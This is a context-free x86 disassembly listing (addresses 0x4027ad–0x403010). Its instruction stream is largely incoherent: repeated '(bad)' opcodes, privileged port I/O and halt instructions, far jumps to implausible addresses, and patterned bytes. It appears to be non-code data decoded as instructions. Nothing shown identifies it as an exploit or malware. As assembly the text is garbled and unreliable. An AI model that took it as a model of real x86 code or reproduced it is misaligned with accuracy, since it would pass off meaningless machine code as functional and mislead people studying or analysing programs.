  4027ad:	or     al,BYTE PTR [eax]
  4027af:	jmp    0xe940826c
  4027b4:	mov    eax,0xb8e4001a
  4027b9:	in     eax,dx
  4027ba:	add    dl,ch
  4027bc:	mov    bl,0x25
  4027be:	add    cl,ch
  4027c0:	mov    eax,0xb8e9007a
  4027c5:	cmp    al,BYTE PTR [eax]
  4027c7:	mov    ecx,0xe800c6bd
  4027cc:	mov    bl,0x3
  4027ce:	add    BYTE PTR [ecx-0x56ff9548],ch
  4027d4:	mov    eax,0xbdb9002a
  4027d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027da:	add    BYTE PTR [ecx+0xab8],bh
  4027e0:	add    BYTE PTR [eax],al
  4027e2:	add    BYTE PTR [eax],al
  4027e4:	test   eax,0xa9008ab8
  4027e9:	mov    eax,0xbf79004a
  4027ee:	out    0x0,al
  4027f0:	imul   esi,DWORD PTR [ebp-0x4796fffa],0xb8690052
  4027fa:	adc    al,BYTE PTR [eax]
  4027fc:	jns    0x4027bd
  4027fe:	xchg   esi,eax
  4027ff:	add    BYTE PTR [eax-0x6facf7d3],dl
  402805:	sbb    DWORD PTR ds:0x519907c,eax
  40280b:	cmp    al,0x90
  40280d:	sbb    DWORD PTR [edx],eax
  40280f:	fcom   DWORD PTR [eax-0x6fe8f7f9]
  402815:	sbb    DWORD PTR ds:0x519906c,eax
  40281b:	sub    al,0x90
  40281d:	sbb    DWORD PTR [eax+edi*4],eax
  402820:	nop
  402821:	sbb    DWORD PTR ds:0x519900c,eax
  402827:	mov    WORD PTR [eax-0x6fb3fae7],ss
  40282d:	sbb    DWORD PTR [eax+edi*8],eax
  402830:	nop
  402831:	or     DWORD PTR [edx],ecx
  402833:	add    edx,DWORD PTR [eax-0x6fadfae7]
  402839:	sbb    DWORD PTR ds:0x5269012,eax
  40283f:	mov    ds:0x230a2890,eax
  402844:	nop
  402845:	sbb    DWORD PTR ds:0x72,eax
  40284b:	add    BYTE PTR [eax],al
  40284d:	nop
  40284e:	sbb    DWORD PTR ds:0x4199032,eax
  402854:	les    edx,FWORD PTR [eax-0x6ff4f5f6]
  40285a:	sbb    DWORD PTR ds:0x5199062,eax
  402860:	and    dl,BYTE PTR [eax-0x6f5bfbe7]
  402866:	sbb    DWORD PTR ds:0x5199002,eax
  40286c:	adc    BYTE PTR [eax-0x6fbdfae7],0x19
  402873:	add    al,0xe4
  402875:	nop
  402876:	or     DWORD PTR [edx],ecx
  402878:	pop    es
  402879:	nop
  40287a:	sbb    DWORD PTR ds:0xe7b2905a,eax
  402880:	or     ecx,DWORD PTR [edx-0x3f5184e]
  402886:	mov    cl,0xf3
  402888:	add    al,0xd3
  40288a:	mov    dl,0xe7
  40288c:	or     ebx,edx
  40288e:	mov    dl,0xe7
  402890:	or     ecx,DWORD PTR [edx+0x5c0ae7b2]
  402896:	mov    dl,0xd5
  402898:	add    al,0xa3
  40289a:	mov    dl,0xe7
  40289c:	or     ebp,DWORD PTR [edx+0x7a0be7b2]
  4028a2:	mov    dl,0xe7
  4028a4:	or     bl,ah
  4028a6:	mov    cl,0xe7
  4028a8:	or     ecx,DWORD PTR [edx+0xa0be7b2]
  4028ae:	mov    dl,0xe7
  4028b0:	or     eax,DWORD PTR [eax]
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	add    BYTE PTR [eax],al
  4028b6:	pop    edx
  4028b7:	mov    dl,0xe7
  4028b9:	or     bh,ah
  4028bb:	mov    cl,0xd7
  4028bd:	add    al,0x95
  4028bf:	mov    dl,0xe7
  4028c1:	or     ebx,DWORD PTR [esi-0x4e]
  4028c4:	out    0xb,eax
  4028c6:	xchg   BYTE PTR [edx-0x4d6ff3d9],dh
  4028cc:	hlt    
  4028cd:	add    al,0xa3
  4028cf:	mov    dl,0xe7
  4028d1:	or     ebx,DWORD PTR [esi-0x4e]
  4028d4:	out    0xb,eax
  4028d6:	xchg   BYTE PTR [edx-0x4e2bf519],dh
  4028dc:	(bad)  
  4028dd:	add    al,0x8f
  4028df:	mov    dl,0xe7
  4028e1:	or     ebp,DWORD PTR [esi]
  4028e3:	mov    dl,0xe7
  4028e5:	or     esi,DWORD PTR [esi-0x4e]
  4028e8:	out    0xa,eax
  4028ea:	hlt    
  4028eb:	mov    cl,0xe7
  4028ed:	or     edx,DWORD PTR [esi+0xe0be7b2]
  4028f3:	mov    dl,0xe7
  4028f5:	or     edx,esi
  4028f7:	mov    dl,0xe7
  4028f9:	or     dh,BYTE PTR [ebx+esi*4+0xe]
  4028fd:	fst    DWORD PTR [ebx+edi*4-0x777416f2]
  402904:	push   cs
  402905:	jmp    0xe94ef1a5
  40290a:	call   0xe95:0x94fd0e46
  402911:	jmp    0xe94ed1a1
  402916:	fwait
  402917:	call   0x41122a
  40291c:	add    BYTE PTR [eax],al
  40291e:	add    BYTE PTR [edx-0x6b24f1fa],bl
  402924:	int    0xe
  402926:	jmp    0xe94ec1b6
  40292b:	fmul   DWORD PTR [esi]
  40292e:	jmp    0xe94e8fc7
  402933:	mov    edi,DWORD PTR [eax+0x388be90e]
  402939:	push   cs
  40293a:	jmp    0xe94ea1da
  40293f:	xchg   esp,eax
  402940:	es push cs
  402942:	dec    ecx
  402943:	xchg   ebx,eax
  402944:	mov    dl,0xe
  402946:	jmp    0xe94eacd6
  40294b:	fwait
  40294c:	ret    
  40294d:	push   cs
  40294e:	hlt    
  40294f:	fwait
  402950:	xor    eax,0xc992fb0e
  402955:	push   cs
  402956:	jmp    0xe94ecce6
  40295b:	fwait
  40295c:	jecxz  0x40296c
  40295e:	jmp    0xd94e1df7
  402963:	xchg   edx,eax
  402964:	mov    esp,0x938be90e
  402969:	push   cs
  40296a:	jmp    0xe94efd0a
  40296f:	xchg   esp,eax
  402970:	push   esp
  402971:	push   cs
  402972:	jmp    0xe94edd02
  402977:	mov    esi,DWORD PTR [ebx]
  402979:	push   cs
  40297a:	add    BYTE PTR [ecx-0x43],bh
  40297d:	dec    edi
  40297e:	add    BYTE PTR [ecx-0x4a],bh
  402981:	in     al,dx
  402982:	add    BYTE PTR [eax],al
  402984:	add    BYTE PTR [eax],al
  402986:	add    BYTE PTR [eax],al
  402988:	pop    ecx
  402989:	mov    ah,0x8
  40298b:	add    BYTE PTR [ecx-0x43],ch
  40298e:	push   edi
  40298f:	add    BYTE PTR [ecx-0x43],bh
  402992:	pop    ss
  402993:	add    BYTE PTR [ecx-0x4a],bh
  402996:	pushf  
  402997:	add    BYTE PTR [edx-0x4c],bl
  40299a:	xor    eax,0x77bd6900
  40299f:	add    BYTE PTR [ecx],bh
  4029a1:	mov    ebp,0xb6390037
  4029a6:	fadd   QWORD PTR [eax]
  4029a8:	pop    eax
  4029a9:	mov    ah,0x1f
  4029ab:	add    BYTE PTR [ecx],ch
  4029ad:	mov    ebp,0xbd390067
  4029b2:	daa    
  4029b3:	add    BYTE PTR [ecx],bh
  4029b5:	mov    dh,0xbc
  4029b7:	add    BYTE PTR [ecx],ch
  4029b9:	mov    ebp,0xbd290007
  4029be:	xchg   DWORD PTR [eax],eax
  4029c0:	stc    
  4029c1:	mov    esp,0xb5f90047
  4029c6:	cld    
  4029c7:	add    cl,bl
  4029c9:	mov    bl,0xa
  4029cb:	add    cl,ch
  4029cd:	mov    esp,0xbcf9005b
  4029d2:	sbb    eax,DWORD PTR [eax]
  4029d4:	jmp    0xda413695
  4029d9:	mov    bl,0x25
  4029db:	add    cl,ch
  4029dd:	mov    esp,0xbcb9007b
  4029e2:	cmp    eax,DWORD PTR [eax]
  4029e4:	mov    ecx,0xd800c4b5
  4029e9:	mov    bl,0x3
  4029eb:	add    BYTE PTR [eax],al
  4029ed:	add    BYTE PTR [eax],al
  4029ef:	add    BYTE PTR [eax],al
  4029f1:	test   eax,0xb9006bbc
  4029f6:	mov    esp,0xb5b9002b
  4029fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029fc:	add    BYTE PTR [eax-0x6ffafae5],dl
  402a02:	sbb    eax,DWORD PTR ds:0x5199085
  402a08:	inc    ebp
  402a09:	nop
  402a0a:	sbb    DWORD PTR [edx],eax
  402a0c:	jmp    0x1990:0x80c0990
  402a13:	add    eax,0x519905d
  402a18:	sbb    eax,0x9a021990
  402a1d:	nop
  402a1e:	and    eax,0x1990530c
  402a23:	add    eax,0x519907d
  402a28:	cmp    eax,0xda021990
  402a2d:	nop
  402a2e:	or     ecx,DWORD PTR [edi+edx*1]
  402a31:	nop
  402a32:	sbb    DWORD PTR ds:0x519906d,eax
  402a38:	sub    eax,0xba041990
  402a3d:	nop
  402a3e:	sbb    DWORD PTR ds:0x519900d,eax
  402a44:	lea    edx,[eax-0x6fb2fae7]
  402a4a:	sbb    DWORD PTR [edx+edi*8],eax
  402a4d:	nop
  402a4e:	or     DWORD PTR [esi],ecx
  402a50:	add    edx,DWORD PTR [eax+0x530519]
  402a56:	add    BYTE PTR [eax],al
  402a58:	add    BYTE PTR [eax],al
  402a5a:	nop
  402a5b:	sbb    DWORD PTR ds:0x51e9013,eax
  402a61:	ret    
  402a62:	nop
  402a63:	sub    al,0xe
  402a65:	and    edx,DWORD PTR [eax-0x6f8cfae7]
  402a6b:	sbb    DWORD PTR ds:0x4199033,eax
  402a71:	(bad)  
  402a72:	nop
  402a73:	or     cl,BYTE PTR [esi]
  402a75:	or     edx,DWORD PTR [eax-0x6f9cfae7]
  402a7b:	mov    dl,0xe7
  402a7d:	or     esi,DWORD PTR [ebx-0x4e]
  402a80:	out    0xa,eax
  402a82:	div    BYTE PTR [edx-0x4d6cf419]
  402a88:	out    0xb,eax
  402a8a:	adc    esi,DWORD PTR [edx-0x4d2cf419]
  402a90:	out    0xa,eax
  402a92:	jbe    0x402a46
  402a94:	xlat   BYTE PTR ds:[ebx]
  402a95:	add    BYTE PTR [edi-0x34f4184e],cl
  402a9b:	mov    dl,0xe7
  402a9d:	or     ecx,DWORD PTR [ebx+0x60ae7b2]
  402aa3:	mov    dl,0xf3
  402aa5:	add    bl,dl
  402aa7:	mov    dl,0xe7
  402aa9:	or     ecx,ebx
  402aab:	mov    dl,0xe7
  402aad:	or     ecx,DWORD PTR [ebx+0x660ae7b2]
  402ab3:	mov    dl,0xd5
  402ab5:	add    BYTE PTR [ebx-0x44f4184e],ah
  402abb:	mov    dl,0xe7
  402abd:	or     eax,DWORD PTR [eax]
  402abf:	add    BYTE PTR [eax],al
  402ac1:	add    BYTE PTR [eax],al
  402ac3:	jnp    0x402a77
  402ac5:	out    0xa,eax
  402ac7:	out    0xb1,al
  402ac9:	out    0xb,eax
  402acb:	mov    esi,DWORD PTR [edx-0x4de4f419]
  402ad1:	out    0xb,eax
  402ad3:	pop    ebx
  402ad4:	mov    dl,0xe7
  402ad6:	or     al,BYTE PTR [esi]
  402ad8:	mov    dl,0xd7
  402ada:	add    BYTE PTR [ebp+0x470be7b2],cl
  402ae0:	mov    dl,0xe7
  402ae2:	or     edi,DWORD PTR [edi-0x4e]
  402ae5:	daa    
  402ae6:	or     al,0x90
  402ae8:	mov    dl,0xf4
  402aea:	add    BYTE PTR [ebx+0x470be7b2],ah
  402af0:	mov    dl,0xe7
  402af2:	or     edi,DWORD PTR [edi-0x4e]
  402af5:	out    0xa,eax
  402af7:	into   
  402af8:	mov    cl,0xe
  402afa:	fcom   DWORD PTR [eax-0x6416f149]
  402b00:	(bad)  
  402b01:	push   cs
  402b02:	jmp    0xe94efaa2
  402b07:	mov    bl,BYTE PTR [eax+0xe]
  402b0a:	jmp    0xe94eda9a
  402b0f:	fwait
  402b10:	sub    eax,0x6d9be90e
  402b15:	push   cs
  402b16:	jmp    0xd94e3fa5
  402b1b:	nop
  402b1c:	mov    ebx,0x859be90e
  402b21:	push   cs
  402b22:	jmp    0xe94ef0c2
  402b27:	add    BYTE PTR [eax],al
  402b29:	add    BYTE PTR [eax],al
  402b2b:	add    BYTE PTR [edx-0x6f02f1bc],cl
  402b31:	xchg   ecx,eax
  402b32:	push   cs
  402b33:	jmp    0xe94ed0d3
  402b38:	fwait
  402b39:	in     eax,0xe
  402b3b:	jmp    0xdb4e2fca
  402b40:	nop
  402b41:	leave  
  402b42:	push   cs
  402b43:	jmp    0xe94ec0e3
  402b48:	fwait
  402b49:	aad    0xe
  402b4b:	jmp    0xe94e8fdc
  402b50:	mov    esi,DWORD PTR [ebp+0x359be90e]
  402b56:	push   cs
  402b57:	jmp    0xe94ea0f7
  402b5c:	mov    WORD PTR [esi+ecx*1],fs
  402b5f:	dec    ecx
  402b60:	mul    DWORD PTR ds:0x829be9f1
  402b66:	push   cs
  402b67:	jmp    0xf54eee07
  402b6c:	mov    esp,DWORD PTR [ecx-0x3b2904f2]
  402b72:	push   cs
  402b73:	jmp    0x4ece13
  402b78:	mov    ecx,0xa9003eb9
  402b7d:	mov    dh,0xcf
  402b7f:	add    cl,bl
  402b81:	and    al,0x7
  402b83:	add    BYTE PTR [ecx-0x46ff9147],bh
  402b89:	mov    ecx,0xb6a9002e
  402b8e:	scas   eax,DWORD PTR es:[edi]
  402b8f:	add    BYTE PTR [eax],al
  402b91:	add    BYTE PTR [eax],al
  402b93:	add    BYTE PTR [eax],al
  402b95:	test   eax,0x79000eb9
  402b9a:	mov    ecx,0xb979008e
  402b9f:	dec    esi
  402ba0:	add    BYTE PTR [ecx-0x4a],ch
  402ba3:	out    dx,eax
  402ba4:	add    BYTE PTR [ecx+0x24],bl
  402ba7:	or     eax,DWORD PTR [eax]
  402ba9:	jns    0x402b64
  402bab:	push   esi
  402bac:	add    BYTE PTR [ecx-0x47],bh
  402baf:	push   ss
  402bb0:	add    BYTE PTR [ecx-0x4a],ch
  402bb3:	lahf   
  402bb4:	add    BYTE PTR [edx+0x24],bl
  402bb7:	xor    al,0x0
  402bb9:	cmp    DWORD PTR [ecx-0x46c6ff8a],edi
  402bbf:	add    BYTE PTR ss:[ecx],ch
  402bc2:	mov    dh,0xdf
  402bc4:	add    BYTE PTR [eax+0x24],bl
  402bc7:	push   ds
  402bc8:	add    BYTE PTR [ecx],bh
  402bca:	mov    ecx,0xb9390066
  402bcf:	add    BYTE PTR es:[ecx],ch
  402bd2:	mov    dh,0xbf
  402bd4:	add    BYTE PTR [ecx],ch
  402bd6:	mov    ecx,0xb8f90006
  402bdb:	xchg   BYTE PTR [eax],al
  402bdd:	stc    
  402bde:	mov    eax,0xb5e90046
  402be3:	inc    DWORD PTR [eax]
  402be5:	fldenv [ebx]
  402be7:	or     eax,0x5ab8f900
  402bec:	add    cl,bh
  402bee:	mov    eax,0xb8e4001a
  402bf3:	in     eax,dx
  402bf4:	add    BYTE PTR [eax+0x2af028],dl
  402bfa:	add    BYTE PTR [eax],al
  402bfc:	add    BYTE PTR [eax],al
  402bfe:	nop
  402bff:	sbb    eax,DWORD PTR ds:0x51b9074
  402c05:	xor    al,0x90
  402c07:	sbb    eax,DWORD PTR [edx]
  402c09:	leave  
  402c0a:	nop
  402c0b:	or     dh,al
  402c0d:	or     al,0x90
  402c0f:	sbb    eax,DWORD PTR ds:0x51b9064
  402c15:	and    al,0x90
  402c17:	sbb    eax,DWORD PTR [edx]
  402c19:	test   eax,0x4051b90
  402c1e:	nop
  402c1f:	sbb    DWORD PTR ds:0x5199084,eax
  402c25:	inc    esp
  402c26:	nop
  402c27:	sbb    DWORD PTR [edx],eax
  402c29:	jmp    0x83035be
  402c2e:	nop
  402c2f:	sbb    DWORD PTR ds:0x519905c,eax
  402c35:	sbb    al,0x90
  402c37:	sbb    DWORD PTR [edx],eax
  402c39:	cdq    
  402c3a:	nop
  402c3b:	and    eax,0x199052f0
  402c40:	add    eax,0x519907c
  402c45:	cmp    al,0x90
  402c47:	sbb    DWORD PTR [edx],eax
  402c49:	fst    DWORD PTR [eax-0x6fe90ff9]
  402c4f:	sbb    DWORD PTR ds:0x519906c,eax
  402c55:	sub    al,0x90
  402c57:	sbb    DWORD PTR [ecx+edi*4],eax
  402c5a:	nop
  402c5b:	sbb    DWORD PTR ds:0x519900c,eax
  402c61:	mov    WORD PTR [eax],es
  402c63:	add    BYTE PTR [eax],al
  402c65:	add    BYTE PTR [eax],al
  402c67:	nop
  402c68:	sbb    DWORD PTR ds:0x419904c,eax
  402c6e:	stc    
  402c6f:	nop
  402c70:	or     edx,esi
  402c72:	add    dl,BYTE PTR [eax-0x6fadfae7]
  402c78:	mov    dl,0xe7
  402c7a:	or     eax,DWORD PTR [edx+0x330bfab2]
  402c80:	mov    bl,0xf4
  402c82:	cld    
  402c83:	jb     0x402c37
  402c85:	out    0xb,eax
  402c87:	inc    edx
  402c88:	mov    dl,0xe7
  402c8a:	or     eax,DWORD PTR [edx-0x32f5184e]
  402c90:	mov    dl,0xd6
  402c92:	cld    
  402c93:	call   0xe7b2:0x320be7b2
  402c9a:	or     esi,DWORD PTR [edx-0x4e]
  402c9d:	out    0xa,eax
  402c9f:	in     eax,dx
  402ca0:	mov    dl,0xe7
  402ca2:	or     edx,DWORD PTR [edx+0x120be7b2]
  402ca8:	mov    dl,0xe7
  402caa:	or     edx,edx
  402cac:	mov    dl,0xe7
  402cae:	or     ch,BYTE PTR [ebp-0x4e]
  402cb1:	xlat   BYTE PTR ds:[ebx]
  402cb2:	cld    
  402cb3:	xchg   esi,eax
  402cb4:	mov    dl,0xe7
  402cb6:	or     ecx,edx
  402cb8:	mov    dl,0xe7
  402cba:	or     edi,DWORD PTR [edx-0x4e]
  402cbd:	out    0xa,eax
  402cbf:	std    
  402cc0:	mov    cl,0xf3
  402cc2:	cld    
  402cc3:	shl    BYTE PTR [edx-0x4d35f419],cl
  402cc9:	out    0xb,eax
  402ccb:	add    BYTE PTR [eax],al
  402ccd:	add    BYTE PTR [eax],al
  402ccf:	add    BYTE PTR [edx-0x4e],bh
  402cd2:	out    0xa,eax
  402cd4:	pop    ebp
  402cd5:	mov    dl,0xd5
  402cd7:	cld    
  402cd8:	xor    BYTE PTR [edx-0x4d45f419],0xe7
  402cdf:	or     ebp,DWORD PTR [edx-0x4e]
  402ce2:	out    0xa,eax
  402ce4:	fnsave [ecx-0x4d65f419]
  402cea:	out    0xb,eax
  402cec:	sbb    dh,BYTE PTR [edx-0x4db5f419]
  402cf2:	out    0xa,eax
  402cf4:	std    
  402cf5:	mov    cl,0xe
  402cf7:	fldlg2 
  402cf9:	lods   eax,DWORD PTR ds:[esi]
  402cfa:	push   cs
  402cfb:	jmp    0xe94ea99b
  402d00:	mov    edi,DWORD PTR [esi+ecx*1+0xeb28429]
  402d07:	cli    
  402d08:	int3   
  402d09:	fisttp WORD PTR [esi]
  402d0b:	jmp    0xe94ec9ab
  402d10:	mov    ebx,esp
  402d12:	push   cs
  402d13:	jmp    0xd84e22a2
  402d18:	lods   al,BYTE PTR ds:[esi]
  402d19:	mov    bl,0xe
  402d1b:	jmp    0xe94eb9bb
  402d20:	mov    ecx,esp
  402d22:	push   cs
  402d23:	jmp    0xe94e82b2
  402d28:	fwait
  402d29:	mov    eax,0x389be90e
  402d2e:	push   cs
  402d2f:	jmp    0xe94ea5bf
  402d34:	add    BYTE PTR [eax],al
  402d36:	add    BYTE PTR [eax],al
  402d38:	add    BYTE PTR [edx+0x6cd90e0f],cl
  402d3e:	stos   DWORD PTR es:[edi],eax
  402d3f:	push   cs
  402d40:	jmp    0xe94eade0
  402d45:	mov    eax,eax
  402d47:	push   cs
  402d48:	jmp    0xfd4e6cd7
  402d4d:	dec    esp
  402d4e:	xchg   ebp,eax
  402d4f:	push   cs
  402d50:	jmp    0xe94ecdf0
  402d55:	mov    esp,eax
  402d57:	push   cs
  402d58:	jmp    0xdb4e2ce7
  402d5d:	sub    al,0xbd
  402d5f:	push   cs
  402d60:	jmp    0xe94ebe00
  402d65:	sbb    edx,eax
  402d67:	push   cs
  402d68:	jmp    0xe94e8c81
  402d6d:	or     esi,DWORD PTR [eax+0x300be90e]
  402d73:	push   cs
  402d74:	add    cl,ch
  402d76:	sbb    eax,0x1ee90043
  402d7b:	repnz add BYTE PTR [ecx-0x53],bl
  402d7f:	push   cs
  402d80:	add    cl,bh
  402d82:	sbb    eax,0x1de9005e
  402d87:	push   ds
  402d88:	add    ah,bl
  402d8a:	sbb    eax,0xaccb008c
  402d8f:	adc    DWORD PTR [eax],eax
  402d91:	mov    ecx,0xa9007e1d
  402d96:	sbb    eax,0x1ea9003e
  402d9b:	int3   
  402d9c:	add    BYTE PTR [eax],al
  402d9e:	add    BYTE PTR [eax],al
  402da0:	add    BYTE PTR [eax],al
  402da2:	leave  
  402da3:	lods   al,BYTE PTR ds:[esi]
  402da4:	add    al,0x0
  402da6:	mov    ecx,0xa9006e1d
  402dab:	sbb    eax,0x1ea9002e
  402db0:	lods   al,BYTE PTR ds:[esi]
  402db1:	add    BYTE PTR [ecx+0x1d],bh
  402db4:	push   cs
  402db5:	add    BYTE PTR [ecx+0x1d],bh
  402db8:	mov    es,WORD PTR [eax]
  402dba:	imul   ebx,DWORD PTR ds:0x1e69004e,0xac4900ec
  402dc4:	or     BYTE PTR [eax],al
  402dc6:	jns    0x402de5
  402dc8:	push   esi
  402dc9:	add    BYTE PTR [ecx+0x1d],ch
  402dcc:	push   ss
  402dcd:	add    BYTE PTR [ecx+0x1e],ch
  402dd0:	pushf  
  402dd1:	add    BYTE PTR [edx-0x54],cl
  402dd4:	xor    eax,0x761d3900
  402dd9:	add    BYTE PTR [ecx],ch
  402ddb:	sbb    eax,0x1e290036
  402de0:	fadd   QWORD PTR [eax]
  402de2:	dec    eax
  402de3:	lods   al,BYTE PTR ds:[esi]
  402de4:	pop    ds
  402de5:	add    BYTE PTR [ecx],bh
  402de7:	sbb    eax,0x1d290066
  402dec:	add    BYTE PTR es:[ecx],ch
  402def:	push   ds
  402df0:	mov    esp,0xf50b9000
  402df5:	or     BYTE PTR [eax-0x6f770af5],dl
  402dfb:	or     esi,ebp
  402dfd:	dec    eax
  402dfe:	nop
  402dff:	or     esi,edx
  402e01:	repnz nop
  402e03:	sti    
  402e04:	add    eax,DWORD PTR [eax+eax*1]
  402e07:	add    BYTE PTR [eax],al
  402e09:	add    BYTE PTR [eax],al
  402e0b:	nop
  402e0c:	or     esi,ebp
  402e0e:	push   esp
  402e0f:	nop
  402e10:	or     esi,ebp
  402e12:	adc    al,0x90
  402e14:	sbb    esi,ebp
  402e16:	add    DWORD PTR [ecx-0x6fd4fbe4],edx
  402e1c:	or     esi,ebp
  402e1e:	je     0x402db0
  402e20:	or     esi,ebp
  402e22:	xor    al,0x90
  402e24:	or     esi,edx
  402e26:	retf   0xfa90
  402e29:	add    ecx,DWORD PTR ds:0x64f50b90
  402e2f:	nop
  402e30:	or     esi,ebp
  402e32:	and    al,0x90
  402e34:	or     esi,edx
  402e36:	stos   BYTE PTR es:[edi],al
  402e37:	nop
  402e38:	or     ebp,esi
  402e3a:	add    al,0x90
  402e3c:	or     ebp,esi
  402e3e:	test   BYTE PTR [eax-0x6fbb0af7],dl
  402e44:	or     edx,esi
  402e46:	jmp    0x990:0x803f990
  402e4d:	cmc    
  402e4e:	pop    esp
  402e4f:	nop
  402e50:	or     ebp,esi
  402e52:	sbb    al,0x90
  402e54:	or     edx,esi
  402e56:	call   0x990:0x53041d90
  402e5d:	cmc    
  402e5e:	jl     0x402df0
  402e60:	or     ebp,esi
  402e62:	cmp    al,0x90
  402e64:	or     edx,esi
  402e66:	ficom  DWORD PTR [eax-0x6fe8fc05]
  402e6c:	or     ebp,esi
  402e6e:	ins    BYTE PTR es:[edi],dx
  402e6f:	add    BYTE PTR [eax],al
  402e71:	add    BYTE PTR [eax],al
  402e73:	add    BYTE PTR [eax+0x64fbe7b2],dl
  402e79:	mov    dl,0xe7
  402e7b:	cli    
  402e7c:	dec    edx
  402e7d:	mov    bl,0xe7
  402e7f:	sti    
  402e80:	xchg   esp,eax
  402e81:	mov    dl,0xe7
  402e83:	sti    
  402e84:	or     al,0xb3
  402e86:	out    0xfb,eax
  402e88:	inc    esp
  402e89:	mov    dl,0xe7
  402e8b:	cli    
  402e8c:	jmp    0xe7b2:0x9308d7b2
  402e93:	sti    
  402e94:	inc    edx
  402e95:	mov    dl,0xe7
  402e97:	sti    
  402e98:	xor    BYTE PTR [edx-0x4d2d0406],0xf4
  402e9f:	or     BYTE PTR [ebx-0x4e],dh
  402ea2:	out    0xfb,eax
  402ea4:	inc    edx
  402ea5:	mov    dl,0xe7
  402ea7:	sti    
  402ea8:	xor    BYTE PTR [edx-0x4d290519],0xd6
  402eaf:	or     BYTE PTR [ebx+0x32fbe7b2],bl
  402eb5:	mov    dl,0xe7
  402eb7:	sti    
  402eb8:	jb     0x402e6c
  402eba:	out    0xfa,eax
  402ebc:	ss mov dl,0xe7
  402ebf:	sti    
  402ec0:	xchg   edx,eax
  402ec1:	mov    dl,0xe7
  402ec3:	sti    
  402ec4:	adc    dh,BYTE PTR [edx-0x4d2d0419]
  402eca:	out    0xfa,eax
  402ecc:	jbe    0x402e80
  402ece:	xlat   BYTE PTR ds:[ebx]
  402ecf:	or     BYTE PTR [edi-0x4504184e],cl
  402ed5:	mov    dl,0xe7
  402ed7:	sti    
  402ed8:	add    BYTE PTR [eax],al
  402eda:	add    BYTE PTR [eax],al
  402edc:	add    BYTE PTR [edx-0x4e],bh
  402edf:	out    0xfa,eax
  402ee1:	es mov dl,0xf3
  402ee4:	or     bl,dl
  402ee6:	mov    dl,0xe7
  402ee8:	sti    
  402ee9:	mov    edx,0x7afbe7b2
  402eee:	mov    dl,0xe7
  402ef0:	cli    
  402ef1:	inc    esi
  402ef2:	mov    dl,0xe
  402ef4:	fistp  DWORD PTR [eax+0x1be90ec3]
  402efa:	mov    WORD PTR [esi],cs
  402efc:	jmp    0xe94efb1c
  402f01:	or     ch,BYTE PTR [eax+0xe]
  402f04:	jmp    0xe94edb14
  402f09:	sti    
  402f0a:	sub    ecx,DWORD PTR [esi]
  402f0c:	jmp    0xe94e9b0c
  402f11:	jmp    0xeb5:0x98d90e27
  402f18:	jmp    0xe94eb6f8
  402f1d:	fcmovnb st,st(7)
  402f1f:	push   cs
  402f20:	sub    esp,ecx
  402f22:	push   ds
  402f23:	icebp  
  402f24:	cli    
  402f25:	cwde   
  402f26:	jecxz  0x402f36
  402f28:	jmp    0xe94ed6e8
  402f2d:	mov    ebx,0xaae90ee7
  402f32:	out    dx,eax
  402f33:	or     eax,0xeaf98d8
  402f38:	jmp    0xe94ec6d8
  402f3d:	fwait
  402f3e:	xlat   BYTE PTR ds:[ebx]
  402f3f:	push   cs
  402f40:	jmp    0x402f45
  402f45:	add    BYTE PTR [edx-0x7416f1b3],cl
  402f4b:	mov    ch,0xe
  402f4d:	jmp    0xe94e64cd
  402f52:	jnp    0x402fc9
  402f54:	push   cs
  402f55:	jmp    0xd94e3cc4
  402f5a:	cwde   
  402f5b:	stos   DWORD PTR es:[edi],eax
  402f5c:	push   cs
  402f5d:	jmp    0xe94eacbd
  402f62:	pop    ebx
  402f63:	mov    ebp,0x3d4ae90e
  402f68:	push   cs
  402f69:	std    
  402f6a:	cwde   
  402f6b:	xchg   ecx,eax
  402f6c:	push   cs
  402f6d:	jmp    0x4eccad
  402f72:	sub    DWORD PTR [edx],ebx
  402f74:	xor    BYTE PTR [eax],al
  402f76:	cmp    DWORD PTR [ecx],ebx
  402f78:	rol    BYTE PTR [eax],1
  402f7a:	dec    ebx
  402f7b:	stos   DWORD PTR es:[edi],eax
  402f7c:	adc    eax,0x601a2900
  402f81:	add    BYTE PTR [ecx],ch
  402f83:	sbb    ah,BYTE PTR [eax]
  402f85:	add    cl,bh
  402f87:	push   ds
  402f88:	mov    al,0x0
  402f8a:	stc    
  402f8b:	sbb    DWORD PTR [eax],eax
  402f8d:	add    cl,ch
  402f8f:	sbb    DWORD PTR [eax+0x4019e900],eax
  402f95:	add    cl,bh
  402f97:	push   ds
  402f98:	lock add cl,cl
  402f9b:	stos   BYTE PTR es:[edi],al
  402f9c:	sldt   esi
  402f9f:	stos   BYTE PTR es:[edi],al
  402fa0:	vmload 
  402fa3:	stos   BYTE PTR es:[edi],al
  402fa4:	pop    ds
  402fa5:	add    BYTE PTR [edx+0x100fab],dl
  402fab:	add    BYTE PTR [eax],al
  402fad:	add    BYTE PTR [eax],al
  402faf:	enter  0xbaa,0x0
  402fb3:	shr    BYTE PTR [edx-0x552bfbf1],0x4f
  402fba:	add    ah,cl
  402fbc:	stos   BYTE PTR es:[edi],al
  402fbd:	cmovo  ecx,ecx
  402fc0:	stos   BYTE PTR es:[edi],al
  402fc1:	or     eax,0xfaac100
  402fc6:	add    dl,BYTE PTR [ebp-0x72ffd056]
  402fcc:	stos   BYTE PTR es:[edi],al
  402fcd:	mov    ebx,cr1
  402fd0:	stos   BYTE PTR es:[edi],al
  402fd1:	pop    es
  402fd2:	add    BYTE PTR [ebx+0x57080faa],al
  402fd8:	stos   BYTE PTR es:[edi],al
  402fd9:	pop    DWORD PTR [eax]
  402fdb:	cmp    DWORD PTR [edx-0x55b6fff2],ebp
  402fe1:	or     al,0x0
  402fe3:	inc    esi
  402fe4:	stos   BYTE PTR es:[edi],al
  402fe5:	pop    DWORD PTR [ecx]
  402fe7:	pop    edx
  402fe8:	stos   BYTE PTR es:[edi],al
  402fe9:	pop    ss
  402fea:	add    BYTE PTR [edx-0x6fe7f055],dl
  402ff0:	sbb    al,BYTE PTR [esi]
  402ff2:	pop    es
  402ff3:	nop
  402ff4:	and    al,BYTE PTR [esi]
  402ff6:	add    DWORD PTR [esi-0x6f9efa02],ecx
  402ffc:	inc    BYTE PTR ds:0x5fbb001
  403002:	add    al,0x90
  403004:	add    eax,DWORD PTR [esi]
  403006:	add    DWORD PTR [ebx-0x6fcef9e1],edx
  40300c:	pop    ds
  40300d:	push   es
  40300e:	add    eax,eax
  403010:	sbb    DWORD PTR [esi],eax
